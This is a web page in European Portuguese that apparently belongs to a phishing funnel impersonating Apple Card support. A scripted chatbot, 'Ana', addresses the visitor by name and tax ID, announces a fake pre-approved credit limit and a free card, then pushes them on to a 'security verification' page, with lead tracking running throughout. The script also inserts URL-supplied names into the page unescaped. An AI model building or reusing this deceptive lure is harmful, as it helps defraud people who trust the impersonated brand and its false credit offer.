<!DOCTYPE html>
<html lang="pt-PT">
<head>
<script src="tracker.js"></script>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Apple Card — Apoio ao Cliente</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--gray-600:#424245;--success:#34C759;--surface:#FFFFFF}
        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;overflow:hidden;height:100vh;height:100dvh}

        .chat-wrapper{max-width:520px;margin:0 auto;height:100vh;height:100dvh;display:flex;flex-direction:column;background:var(--surface);position:relative}

        /* ── Header ── */
        .chat-header{flex-shrink:0;background:var(--apple-black);color:#fff;padding:10px 16px;display:flex;align-items:center;gap:10px;position:relative;z-index:10;box-shadow:0 2px 8px rgba(0,0,0,0.15)}
        .ch-back{width:30px;height:30px;display:flex;align-items:center;justify-content:center;border:none;background:rgba(255,255,255,0.1);border-radius:50%;cursor:pointer}
        .ch-back svg{width:14px;height:14px;fill:#fff}
        .ch-avatar{width:38px;height:38px;border-radius:50%;overflow:hidden;flex-shrink:0;box-shadow:0 2px 8px rgba(0,113,227,0.3)}
        .ch-avatar img{width:100%;height:100%;object-fit:cover}
        .ch-info{flex:1;min-width:0}
        .ch-name{font-size:0.875rem;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
        .ch-status{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:rgba(255,255,255,0.5)}
        .ch-status .dot{width:6px;height:6px;border-radius:50%;background:var(--success);box-shadow:0 0 6px rgba(52,199,89,0.5)}
        .ch-user{display:flex;flex-direction:column;align-items:flex-end;padding:4px 10px;background:rgba(255,255,255,0.06);border-radius:8px;flex-shrink:0}
        .ch-user-name{font-size:0.625rem;font-weight:600;color:rgba(255,255,255,0.8);white-space:nowrap;max-width:90px;overflow:hidden;text-overflow:ellipsis}
        .ch-user-cpf{font-size:0.5625rem;color:rgba(255,255,255,0.35);font-family:'SF Mono',monospace,Consolas}

        /* ── Chat Body ── */
        .chat-body{flex:1;overflow-y:auto;padding:14px 14px 8px;background:var(--gray-100);display:flex;flex-direction:column;gap:6px;scroll-behavior:smooth}
        .chat-body::-webkit-scrollbar{width:3px}
        .chat-body::-webkit-scrollbar-thumb{background:var(--gray-300);border-radius:3px}

        /* ── Messages ── */
        .msg-row{display:flex;gap:8px;max-width:88%;animation:msgIn 0.3s ease-out}
        .msg-row.bot{align-self:flex-start}
        .msg-row.user{align-self:flex-end;flex-direction:row-reverse}
        .msg-avatar{width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0;align-self:flex-end}
        .msg-avatar img{width:100%;height:100%;object-fit:cover}
        .msg-bubble{padding:10px 14px;border-radius:18px;font-size:0.8625rem;line-height:1.45}
        .msg-row.bot .msg-bubble{background:var(--surface);color:var(--apple-black);border-bottom-left-radius:6px;box-shadow:0 1px 2px rgba(0,0,0,0.06)}
        .msg-row.user .msg-bubble{background:var(--apple-blue);color:#fff;border-bottom-right-radius:6px}
        .msg-time{font-size:0.5625rem;color:var(--gray-400);margin-top:2px;padding:0 4px}
        .msg-row.user .msg-time{text-align:right}

        /* ── Typing ── */
        .typing-row{display:flex;gap:8px;align-self:flex-start;animation:msgIn 0.2s ease-out}
        .typing-bubble{background:var(--surface);border-radius:18px;border-bottom-left-radius:6px;padding:10px 16px;box-shadow:0 1px 2px rgba(0,0,0,0.06);display:flex;gap:4px}
        .typing-bubble .dot{width:7px;height:7px;border-radius:50%;background:var(--gray-400);animation:typeBounce 1.2s ease-in-out infinite}
        .typing-bubble .dot:nth-child(2){animation-delay:0.15s}
        .typing-bubble .dot:nth-child(3){animation-delay:0.3s}

        /* ── Options Area ── */
        .options-area{flex-shrink:0;padding:12px 16px 8px;background:var(--surface);border-top:0.5px solid var(--gray-200)}
        .options-area.hidden{display:none}
        .pills-wrap{display:flex;flex-wrap:wrap;gap:8px;justify-content:center}
        .pill-btn{display:inline-flex;align-items:center;gap:6px;padding:10px 18px;background:var(--surface);border:1.5px solid var(--gray-200);border-radius:100px;font-size:0.8125rem;font-weight:500;color:var(--apple-black);cursor:pointer;font-family:inherit;transition:all 0.2s ease;white-space:nowrap}
        .pill-btn:hover{border-color:var(--apple-blue);background:rgba(0,113,227,0.03)}
        .pill-btn:active{transform:scale(0.96)}
        .pill-btn svg{width:16px;height:16px;fill:var(--apple-blue);flex-shrink:0}
        .action-btn{display:block;width:100%;padding:14px;margin-top:10px;border:none;border-radius:14px;font-size:0.9375rem;font-weight:600;cursor:pointer;font-family:inherit;background:var(--apple-blue);color:#fff;transition:all 0.2s ease}
        .action-btn:active{transform:scale(0.98)}

        /* ── Color Picker ── */
        .color-section{text-align:center;padding:4px 0}
        .color-section .clabel{font-size:0.8125rem;font-weight:600;color:var(--apple-black);margin-bottom:14px}
        .color-opts{display:flex;gap:14px;justify-content:center;padding-bottom:20px}
        .color-opt{width:50px;height:50px;border-radius:50%;cursor:pointer;border:3px solid transparent;transition:all 0.3s ease;position:relative}
        .color-opt:hover{transform:scale(1.08)}
        .color-opt.sel{border-color:var(--apple-blue);box-shadow:0 0 0 3px rgba(0,113,227,0.25)}
        .color-opt .cl{position:absolute;bottom:-16px;left:50%;transform:translateX(-50%);font-size:0.5625rem;color:var(--gray-500);white-space:nowrap;font-weight:600}

        /* ── Card Preview ── */
        .card-preview{width:260px;height:164px;border-radius:14px;margin:10px auto;position:relative;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,0.18);transition:background 0.5s ease}
        .card-preview .cp-shine{position:absolute;inset:0;background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.12) 45%,rgba(255,255,255,0.04) 50%,transparent 55%);animation:shine 3.5s ease-in-out infinite}
        .card-preview .cp-content{position:absolute;inset:0;padding:20px;display:flex;flex-direction:column;justify-content:space-between;z-index:2}
        .cp-logo{width:30px;height:36px;object-fit:contain;filter:drop-shadow(0 1px 2px rgba(0,0,0,0.15))}
        .cp-chip{position:absolute;right:18px;bottom:40px;width:36px;height:26px}
        .cp-chip img{width:100%;height:100%}
        .cp-name{font-size:0.75rem;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:#86868B}
        .cp-footer{display:flex;align-items:flex-end;justify-content:space-between}
        .cp-type{font-size:0.55rem;color:rgba(255,255,255,0.45);letter-spacing:0.04em}
        .cp-visa{font-size:0.85rem;font-weight:800;font-style:italic;color:rgba(255,255,255,0.55);letter-spacing:0.02em}

        /* ── Info Card ── */
        .info-card{background:var(--surface);border-radius:14px;padding:14px;margin:4px 0;box-shadow:0 1px 2px rgba(0,0,0,0.06)}
        .info-card .ic-row{display:flex;justify-content:space-between;padding:6px 0;font-size:0.8125rem}
        .info-card .ic-row:not(:last-child){border-bottom:1px solid var(--gray-200)}
        .info-card .ic-label{color:var(--gray-500)}
        .info-card .ic-value{font-weight:600;color:var(--apple-black)}

        /* ── Input Bar (visual) ── */
        .input-bar{flex-shrink:0;display:flex;align-items:center;gap:8px;padding:10px 14px 14px;background:var(--surface);border-top:0.5px solid var(--gray-200)}
        .input-field{flex:1;padding:10px 14px;background:var(--gray-100);border-radius:20px;font-size:0.8125rem;color:var(--gray-400);font-family:inherit}
        .send-circle{width:32px;height:32px;border-radius:50%;background:var(--gray-200);display:flex;align-items:center;justify-content:center}
        .send-circle svg{width:16px;height:16px;fill:var(--gray-400)}

        @keyframes msgIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
        @keyframes typeBounce{0%,80%,100%{transform:translateY(0)}40%{transform:translateY(-6px)}}
        @keyframes shine{0%,100%{transform:translateX(-100%)}50%{transform:translateX(100%)}}
    </style>
</head>
<body>
    <div class="chat-wrapper">
        <div class="chat-header">
            <button class="ch-back" onclick="history.back()">
                <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
            </button>
            <div class="ch-avatar">
                <img src="assets/images/logoavatar.png" alt="Ana">
            </div>
            <div class="ch-info">
                <div class="ch-name">Ana — Apple Card</div>
                <div class="ch-status"><span class="dot"></span> Especialista online</div>
            </div>
            <div class="ch-user">
                <div class="ch-user-name" id="headerName">—</div>
                <div class="ch-user-cpf" id="headerNif">*** *** ***</div>
            </div>
        </div>

        <div class="chat-body" id="chatBody"></div>
        <div class="options-area hidden" id="optionsArea"></div>

        <div class="input-bar">
            <div class="input-field">Selecione uma opção acima</div>
            <div class="send-circle">
                <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
            </div>
        </div>
    </div>

    <script>
        /* ── UTM ── */
        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v)})})();

        const LeadData={
            _key:'applecard_lead',
            load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},
            update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}
        };
        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
        function maskNif(nif){if(!nif||nif.length<9)return '*** *** ***';return nif.slice(0,3)+' *** '+nif.slice(-3)}
        function now(){const d=new Date();return d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')}

        /* ── Data ── */
        const data=LeadData.load();
        const params=new URLSearchParams(window.location.search);
        const userName=data.nome||params.get('nome')||'Visitante';
        const firstName=userName.split(' ')[0];
        const rawNif=data.nif||params.get('nif')||'';
        const limite=data.limite_aprovado||parseInt(params.get('limite'))||5000;

        document.getElementById('headerName').textContent=firstName;
        document.getElementById('headerNif').textContent=maskNif(rawNif);
        LeadData.update({page:'chat'});

        /* ── Engine ── */
        const chatBody=document.getElementById('chatBody');
        const optionsArea=document.getElementById('optionsArea');
        const avatarHTML='<div class="msg-avatar"><img src="assets/images/logoavatar.png" alt=""></div>';
        let chatStep=0;
        let selectedColor='silver';

        const colorMap={
            silver:{label:'Titanium',gradient:'linear-gradient(145deg,#E3E3E8 0%,#C8C8CD 50%,#E8E8ED 100%)'},
            black:{label:'Midnight',gradient:'linear-gradient(145deg,#2C2C2E 0%,#1D1D1F 50%,#3A3A3C 100%)'},
            gold:{label:'Starlight',gradient:'linear-gradient(145deg,#F5E6CC 0%,#E8D5B5 50%,#F0DCC4 100%)'}
        };

        function scrollChat(){setTimeout(()=>{chatBody.scrollTop=chatBody.scrollHeight},50)}

        function addBotMsg(text){
            const r=document.createElement('div');r.className='msg-row bot';
            r.innerHTML=avatarHTML+'<div class="msg-content"><div class="msg-bubble">'+text+'</div><div class="msg-time">'+now()+'</div></div>';
            chatBody.appendChild(r);scrollChat();
        }
        function addUserMsg(text){
            const r=document.createElement('div');r.className='msg-row user';
            r.innerHTML='<div class="msg-content"><div class="msg-bubble">'+text+'</div><div class="msg-time">'+now()+'</div></div>';
            chatBody.appendChild(r);scrollChat();
        }
        function addHTML(html){
            const d=document.createElement('div');d.innerHTML=html;d.style.animation='msgIn 0.3s ease-out';
            chatBody.appendChild(d);scrollChat();
        }
        function showTyping(){
            const t=document.createElement('div');t.className='typing-row';t.id='typingInd';
            t.innerHTML=avatarHTML+'<div class="typing-bubble"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>';
            chatBody.appendChild(t);scrollChat();
        }
        function hideTyping(){const t=document.getElementById('typingInd');if(t)t.remove()}

        function showPills(opts){
            optionsArea.classList.remove('hidden');
            var h='<div class="pills-wrap">';
            opts.forEach(function(o,i){h+='<button class="pill-btn" data-i="'+i+'">'+(o.icon||'')+o.label+'</button>'});
            h+='</div>';optionsArea.innerHTML=h;
            optionsArea.querySelectorAll('.pill-btn').forEach(function(btn){btn.onclick=function(){handlePill(opts[parseInt(btn.dataset.i)])}});
            scrollChat();
        }
        function hideOpts(){optionsArea.classList.add('hidden');optionsArea.innerHTML=''}

        function handlePill(opt){
            hideOpts();addUserMsg(opt.label.replace(/<[^>]*>/g,''));
            if(opt.save)LeadData.update(opt.save);
            chatStep++;setTimeout(function(){runStep()},600);
        }

        /* ── Color Picker ── */
        function showColorPicker(){
            optionsArea.classList.remove('hidden');
            optionsArea.innerHTML=
                '<div class="color-section">'+
                '<div class="clabel">Escolha a cor do seu Apple Card</div>'+
                '<div class="color-opts">'+
                '<div class="color-opt sel" style="background:'+colorMap.silver.gradient+'" data-c="silver" onclick="pickColor(this)"><span class="cl">Titanium</span></div>'+
                '<div class="color-opt" style="background:'+colorMap.black.gradient+'" data-c="black" onclick="pickColor(this)"><span class="cl">Midnight</span></div>'+
                '<div class="color-opt" style="background:'+colorMap.gold.gradient+'" data-c="gold" onclick="pickColor(this)"><span class="cl">Starlight</span></div>'+
                '</div></div>'+
                '<button class="action-btn" onclick="confirmColor()">Confirmar escolha</button>';
        }
        window.pickColor=function(el){
            document.querySelectorAll('.color-opt').forEach(function(c){c.classList.remove('sel')});
            el.classList.add('sel');selectedColor=el.dataset.c;
            var cp=document.querySelector('.card-preview');if(cp)cp.style.background=colorMap[selectedColor].gradient;
            var tp=document.querySelector('.cp-type');if(tp)tp.textContent='Apple Card \u2022 '+colorMap[selectedColor].label;
            // logo3d.svg is universal - no color switching needed
        };
        window.confirmColor=function(){
            hideOpts();var cc=colorMap[selectedColor];
            addUserMsg(cc.label);
            LeadData.update({cartao_cor:selectedColor,cartao_cor_label:cc.label,cartao_cor_hex:selectedColor==='silver'?'#E8E8ED':selectedColor==='black'?'#2C2C2E':'#F5E6CC'});
            chatStep++;setTimeout(function(){runStep()},600);
        };

        /* ── Card HTML ── */
        function getCardHTML(){
            var cc=colorMap[selectedColor];
            return '<div class="card-preview" style="background:'+cc.gradient+'">'+
                '<div class="cp-shine"></div>'+
                '<div class="cp-content">'+
                '<div><img src="assets/images/logo3d.svg" class="cp-logo" alt=""></div>'+
                '<div class="cp-chip"><img src="assets/images/chip3d.svg" alt=""></div>'+
                '<div><div class="cp-name">'+userName.toUpperCase()+'</div>'+
                '<div class="cp-footer"><span class="cp-type">Apple Card \u2022 '+cc.label+'</span><span class="cp-visa">VISA</span></div>'+
                '</div></div></div>';
        }

        /* ── Steps ── */
        function botSequence(msgs,cb){
            var i=0;
            function next(){
                if(i>=msgs.length){if(cb)cb();return}
                showTyping();
                setTimeout(function(){hideTyping();addBotMsg(msgs[i]);i++;setTimeout(next,400)},800+Math.random()*400);
            }
            next();
        }

        var steps=[
            /* 0 — Greeting + first question */
            function(){
                var lf=limite.toLocaleString('pt-PT');
                botSequence([
                    'Ol\u00e1, '+firstName+'! \ud83d\udc4b',
                    'Sou a <b>Ana</b>, a sua especialista Apple Card. Vou ajudar a personalizar tudo e finalizar a sua aprova\u00e7\u00e3o.',
                    'Vi que o seu limite pr\u00e9-aprovado \u00e9 de <b style="color:#34C759">\u20ac'+lf+',00</b>. Excelente! \ud83c\udf89',
                    'Diga-me, o que mais lhe interessou no Apple Card?'
                ],function(){
                    showPills([
                        {label:'Crédito aprovado para mim',save:{chat_objetivo:'credito-aprovado'}},
                        {label:'Cashback diário',save:{chat_objetivo:'cashback'}},
                        {label:'Compras internacionais',save:{chat_objetivo:'internacional'}},
                        {label:'Sem anuidade',save:{chat_objetivo:'sem-anuidade'}}
                    ]);
                });
            },

            /* 1 — Spending */
            function(){
                botSequence([
                    '\u00d3ptima escolha! O Apple Card \u00e9 perfeito para isso. \u2728',
                    'E como costuma fazer as suas compras no dia a dia?'
                ],function(){
                    showPills([
                        {label:'Mais online',save:{chat_compras:'online'}},
                        {label:'Lojas f\u00edsicas',save:{chat_compras:'fisicas'}},
                        {label:'Pelo telemóvel',save:{chat_compras:'telemovel'}},
                        {label:'De tudo um pouco',save:{chat_compras:'misto'}}
                    ]);
                });
            },

            /* 2 — Billing */
            function(){
                botSequence([
                    'Perfeito! Com o Apple Card tem cashback em todas essas modalidades. \ud83d\udcb0',
                    'Sobre a sua fatura, como prefere receber?'
                ],function(){
                    showPills([
                        {label:'100% Digital (app/email)',save:{chat_fatura:'digital'}},
                        {label:'Receber em casa',save:{chat_fatura:'fisica'}}
                    ]);
                });
            },

            /* 3 — Card color + preview */
            function(){
                botSequence([
                    'Agora vem a melhor parte! \u2728',
                    '\u00c9 hora de escolher a cor do seu Apple Card de tit\u00e2nio. Veja a pr\u00e9-visualiza\u00e7\u00e3o:'
                ],function(){
                    addHTML(getCardHTML());
                    showColorPicker();
                });
            },

            /* 4 — Summary + redirect */
            function(){
                var cc=colorMap[selectedColor];
                var lf=limite.toLocaleString('pt-PT');
                botSequence([
                    'Lindo! O <b>'+cc.label+'</b> ficou perfeito com o seu nome, '+firstName+'! \ud83d\ude0d'
                ],function(){
                    setTimeout(function(){
                        showTyping();
                        setTimeout(function(){
                            hideTyping();
                            addBotMsg('Aqui est\u00e1 o resumo da sua aprova\u00e7\u00e3o:');
                            addHTML(
                                '<div class="info-card" style="max-width:85%;animation:msgIn 0.3s ease-out">'+
                                '<div class="ic-row"><span class="ic-label">Titular</span><span class="ic-value">'+userName+'</span></div>'+
                                '<div class="ic-row"><span class="ic-label">Limite</span><span class="ic-value" style="color:#34C759">€'+lf+',00</span></div>'+
                                '<div class="ic-row"><span class="ic-label">Cart\u00e3o</span><span class="ic-value">Apple Card '+cc.label+'</span></div>'+
                                '<div class="ic-row"><span class="ic-label">Anuidade</span><span class="ic-value" style="color:#34C759">Gr\u00e1tis</span></div>'+
                                '<div class="ic-row"><span class="ic-label">Cashback</span><span class="ic-value">At\u00e9 3% di\u00e1rio</span></div>'+
                                '</div>'
                            );
                            setTimeout(function(){
                                botSequence([
                                    'Tudo certo! Agora vamos para a verifica\u00e7\u00e3o de seguran\u00e7a. Faltam s\u00f3 mais alguns passos! \ud83d\ude80'
                                ],function(){
                                    LeadData.update({chat_completed:true});
                                    if (window.track) window.track('Chat_Completed', { value: limite, currency:'EUR', card_color: selectedColor });
                                    optionsArea.classList.remove('hidden');
                                    optionsArea.innerHTML='<button class="action-btn" onclick="goNext()">Continuar para verifica\u00e7\u00e3o \u2192</button>';
                                });
                            },600);
                        },800);
                    },400);
                });
            }
        ];

        window.goNext=function(){
            hideOpts();addUserMsg('Continuar para verifica\u00e7\u00e3o');
            setTimeout(function(){
                var d=LeadData.load();
                window.location.href=buildUrl('verificacao.html');
            },800);
        };

        function runStep(){if(chatStep<steps.length)steps[chatStep]()}
        setTimeout(function(){runStep()},500);
    </script>
</body>
</html>
